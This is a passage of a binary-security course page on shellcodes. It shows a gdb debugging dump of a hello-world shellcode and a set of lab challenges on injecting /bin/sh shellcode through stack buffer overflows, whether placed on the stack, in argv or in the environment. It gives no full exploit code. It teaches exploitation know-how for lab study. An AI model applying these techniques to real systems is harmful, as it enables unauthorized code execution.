direction overflow)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-------------------------------------code-------------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x40405a:    add    BYTE PTR [rax],al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x40405c:    add    BYTE PTR [rax],al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x40405e:    add    BYTE PTR [rax],al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">=&gt; 0x404060 &lt;machine_code&gt;:     movabs rbx,0xa21646c726f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x40406a &lt;machine_code+10&gt;:  push   rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x40406b &lt;machine_code+11&gt;:  movabs rbx,0x77202c6f6c6c6548</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x404075 &lt;machine_code+21&gt;:  push   rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x404076 &lt;machine_code+22&gt;:  mov    rsi,rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[------------------------------------stack-------------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000| 0x7fffffffd390 --&gt; 0x7fffffffd40a --&gt; 0xd478000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0008| 0x7fffffffd398 --&gt; 0x1f7fca000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0016| 0x7fffffffd3a0 --&gt; 0x401126 (&lt;main&gt;:      push   rbp)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0024| 0x7fffffffd3a8 --&gt; 0x7fffffffd859 --&gt; 0x54bcc0a1225a8900</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0032| 0x7fffffffd3b0 --&gt; 0x401160 (&lt;__libc_csu_init&gt;:   endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0040| 0x7fffffffd3b8 --&gt; 0x352575cde5bb22d8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0048| 0x7fffffffd3c0 --&gt; 0x401040 (&lt;_start&gt;:    endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0056| 0x7fffffffd3c8 --&gt; 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[------------------------------------------------------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Legend: code, data, rodata, value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x0000000000404060 in machine_code ()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="challenges">Challenges<a class="hash-link" href="#challenges" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="06-challenge-binsh-shellcode">06. Challenge: /bin/sh Shellcode<a class="hash-link" href="#06-challenge-binsh-shellcode" title="Direct link to heading">​</a></h3><p>You are given a piece of assembly code that attempts to spawn a shell with the aid of the <code>execve</code> syscall.
However, the given code is buggy and it will not work.
Your task is to figure out what&#x27;s wrong with it and fix it.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="07-challenge-shellcode-on-stack">07. Challenge: Shellcode on Stack<a class="hash-link" href="#07-challenge-shellcode-on-stack" title="Direct link to heading">​</a></h3><p>Up until now we have injected code into some memory area, then used a stack-buffer-overflow vulnerability to overwrite a saved return address and hijack control flow.
If we think about it, the legitimately reserved buffer space on the stack <em>is</em> a memory area and we could perform our attack using a single read: the overflowing one.</p><p>So our payload will consist of the bytes in our shellcode, then some junk to pad the rest of the space to the saved return, then the address of the buffer itself:</p><p><img loading="lazy" alt="Shellcode on Stack" src="/binary-security/assets/images/shellcode_below-789839baadbaa991009ac8100fc817d6.png" width="791" height="416" class="img_ev3q"></p><p>Now that our shellcode is written on the stack, things become a little harder.
Due to several factors (such as the fact that environment variables and command-line arguments are placed by the loader on the stack), it is difficult to predict the address at which any value will be placed on the stack.
For now, the binary will generously print it for us.</p><p>You can observe the volatility of the stack by changing how you launch the program (remember that the path of the binary is considered a command-line argument, namely <code>argv[0]</code> so it too gets placed on the stack, thus things change depending on what exact relative or absolute path we use):</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd5d0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ../07-challenge-shellcode-on-stack/vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd550</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./vuln asdf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd5c0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./vuln asdfqwer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd5c0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./vuln asdfqwerasdfqwer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd5b0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./vuln asdf qwer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd5b0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ FOO=bar ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd5c0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="08-challenge-shellcode-after-saved-return-address">08. Challenge: Shellcode after Saved Return Address<a class="hash-link" href="#08-challenge-shellcode-after-saved-return-address" title="Direct link to heading">​</a></h3><p>In the previous challenge, we placed our shellcode on the stack, in the space between the overflown buffer&#x27;s beginning and the saved return address.
However, we could switch things up and place the shellcode in the area <strong>after</strong> the saved return address.
This might be useful when the stack buffer is too short to hold our payload.</p><p>So our payload will consist of padding junk from the beginning of the buffer to the saved return, the address of the next stack portion, then the bytes of our shellcode.</p><p><img loading="lazy" alt="Shellcode Above" src="/binary-security/assets/images/shellcode_above-8bd12af8a95e585ecbbdee364d2cf1cf.png" width="791" height="416" class="img_ev3q"></p><p>To recap: given a stack-buffer-overflow vulnerability we can not only hijack control flow, but also place a shellcode on the stack using the buggy read.
There are two regions where we can do this:</p><ul><li>between the buffer start and the saved return address:
The number of bytes we can write here is determined by <strong>how much space was allocated on the stack</strong>.</li><li>after the saved return address:
The number of bytes we can write here is determined by <strong>how many bytes are read</strong>.</li></ul><p>If any of these regions is too small, we can try the other one.
If both of them are too small, that&#x27;s a problem.
However, note that shellcodes are usually tiny.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="09-challenge-shellcode-after-saved-return-address---no-leak">09. Challenge: Shellcode after Saved Return Address - No Leak<a class="hash-link" href="#09-challenge-shellcode-after-saved-return-address---no-leak" title="Direct link to heading">​</a></h3><p>This is the same as the previous challenge, only this time the executable does not conveniently leak the buffer&#x27;s address.
So you will have to deal with the differences between running a binary inside and outside of <code>gdb</code> to precisely determine the necessary address, then jump to it.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="10-challenge-shellcode-as-command-line-argument">10. Challenge: Shellcode as Command-Line Argument<a class="hash-link" href="#10-challenge-shellcode-as-command-line-argument" title="Direct link to heading">​</a></h3><p>As mentioned in the introduction, reading from standard input or from a file isn&#x27;t the only way to place content inside the memory space of a process.
If we can launch the executable, we can modify its environment or command-line arguments.
The fact that a program might not use its arguments or environment is irrelevant, the loader can&#x27;t know this, so it places them in the address space anyway.</p><p>Take the <code>/bin/sh</code> shellcode and feed it to the program as a command-line argument, then exploit the  to actually run it.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="11-challenge-shellcode-in-the-environment">11. Challenge: Shellcode in the Environment<a class="hash-link" href="#11-challenge-shellcode-in-the-environment" title="Direct link to heading">​</a></h3><p>Take the <code>/bin/sh</code> shellcode and place it in the environment, then exploit the stack buffer overflow to actually run it.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="further-reading">Further Reading<a class="hash-link" href="#further-reading" title="Direct link to heading">​</a></h2><p><a href="http://phrack.org/issues/49/14.html" target="_blank" rel="noopener noreferrer">&quot;Smashing The Stack For Fun And Profit&quot;, Aleph One</a> - a legendary attack paper documenting stack buffer overflows and shellcodes.
As it is written in &#x27;96, the examples in it will probably <em>not</em> work (either out-of-the-box or with some tweaks).
We recommend perusing it for its historical/cultural significance, but don&#x27;t waste much time on the technical details of the examples.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="resources">Resources<a class="hash-link" href="#resources" title="Direct link to heading">​</a></h2><p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener noreferrer">Shell-storm</a> - a repository of shellcodes.</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/binary-security/Exploitation Techniques/Shellcodes/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Shellcodes</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/binary-security/Exploitation Techniques/Shellcodes Advanced/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Shellcodes Advanced</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction" class="table-of-contents__link toc-highlight">Introduction</a><ul><li><a href="#stack-buffer-overflow-recap" class="table-of-contents__link toc-highlight">Stack Buffer Overflow Recap</a></li><li><a href="#code-injection" class="table-of-contents__link toc-highlight">Code Injection</a></li><li><a href="#shellcodes-1" class="table-of-contents__link toc-highlight">&quot;Shellcodes&quot;</a></li></ul></li><li><a href="#tutorials" class="table-of-contents__link toc-highlight">Tutorials</a><ul><li><a href="#01-tutorial-generating-machine-code" class="table-of-contents__link toc-highlight">01. Tutorial: Generating Machine Code</a></li><li><a href="#02-tutorial-inspecting-machine-code" class="table-of-contents__link toc-highlight">02. Tutorial: Inspecting Machine Code</a></li><li><a href="#03-tutorial-feeding-machine-code-to-a-program" class="table-of-contents__link toc-highlight">03. Tutorial: Feeding Machine Code to a Program</a></li><li><a href="#04-tutorial-hello-world-shellcode" class="table-of-contents__link toc-highlight">04. Tutorial: &quot;Hello, world!&quot; Shellcode</a></li><li><a href="#05-tutorial-debugging-shellcodes" class="table-of-contents__link toc-highlight">05. Tutorial: Debugging Shellcodes</a></li></ul></li><li><a href="#challenges" class="table-of-contents__link toc-highlight">Challenges</a><ul><li><a href="#06-challenge-binsh-shellcode" class="table-of-contents__link toc-highlight">06. Challenge: /bin/sh Shellcode</a></li><li><a href="#07-challenge-shellcode-on-stack" class="table-of-contents__link toc-highlight">07. Challenge: Shellcode on Stack</a></li><li><a href="#08-challenge-shellcode-after-saved-return-address" class="table-of-contents__link toc-highlight">08. Challenge: Shellcode after Saved Return Address</a></li><li><a href="#09-challenge-shellcode-after-saved-return-address---no-leak" class="table-of-contents__link toc-highlight">09. Challenge: Shellcode after Saved Return Address - No Leak</a></li><li><a href="#10-challenge-shellcode-as-command-line-argument" class="table-of-contents__link toc-highlight">10. Challenge: Shellcode as Command-Line Argument</a></li><li><a href="#11-challenge-shellcode-in-the-environment" class="table-of-contents__link toc-highlight">11. Challenge: Shellcode in the Environment</a></li></ul></li><li><a href="#further-reading" class="table-of-contents__link toc-highlight">Further Reading</a></li><li><a href="#resources" class="table-of-contents__link toc-highlight">Resources</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://security-summer-school.github.io/binary/" target="_blank" rel="noopener noreferrer" class="footer__link-item">site<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://www.facebook.com/SSSUPB/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Facebook<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 SSS Team</div></div></div></footer></div>
<script src="/binary-security/assets/js/runtime~main.74200969.js"></script>
<script src="/binary-security/assets/js/main.d9be8505.js"></script>
</body>
</html>